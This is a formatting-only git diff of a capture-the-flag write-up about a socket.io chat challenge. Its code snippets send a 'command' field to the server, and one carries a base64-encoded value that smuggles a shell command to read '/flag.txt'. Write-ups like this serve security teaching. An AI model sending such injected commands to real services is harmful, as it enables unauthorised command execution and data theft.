@@ -24,7 +24,7 @@ aliases = [
 ]
 +++
 
-- Points: 2300
+-   Points: 2300
 
 ## Description
 
@@ -40,21 +40,23 @@ If we take a look at the source, we also find a bit of javascript:
 
 ```js
 $(function () {
-  var socket = io();
-  $("form").submit(function () {
-    socket.emit("chat message", { message: $("#m").val() });
-    $("#m").val("");
-    return false;
-  });
-  socket.on("chat message", function (msg) {
-    console.log(msg.command);
-    if (msg.command === "code") {
-      $("#messages").append($("<li>").html("<pre>" + msg.message + "</pre>"));
-    } else {
-      $("#messages").append($("<li>").text(msg.message));
-    }
-    window.scrollTo(0, document.body.scrollHeight);
-  });
+    var socket = io();
+    $("form").submit(function () {
+        socket.emit("chat message", { message: $("#m").val() });
+        $("#m").val("");
+        return false;
+    });
+    socket.on("chat message", function (msg) {
+        console.log(msg.command);
+        if (msg.command === "code") {
+            $("#messages").append(
+                $("<li>").html("<pre>" + msg.message + "</pre>")
+            );
+        } else {
+            $("#messages").append($("<li>").text(msg.message));
+        }
+        window.scrollTo(0, document.body.scrollHeight);
+    });
 });
 ```
 
@@ -108,8 +110,8 @@ Because the code tries to read `msg.command`, let's try adding a command to the 
 
 ```js
 socket.emit("chat message", {
-  message: "Hello",
-  command: "ls",
+    message: "Hello",
+    command: "ls",
 });
 ```
 
@@ -197,8 +199,8 @@ Lyc7IGNhdCAnL2ZsYWcudHh0⏎
 
 ```js
 socket.emit("chat message", {
-  message: "Lyc7IGNhdCAnL2ZsYWcudHh0",
-  command: "execute",
+    message: "Lyc7IGNhdCAnL2ZsYWcudHh0",
+    command: "execute",
 });
 ```
 
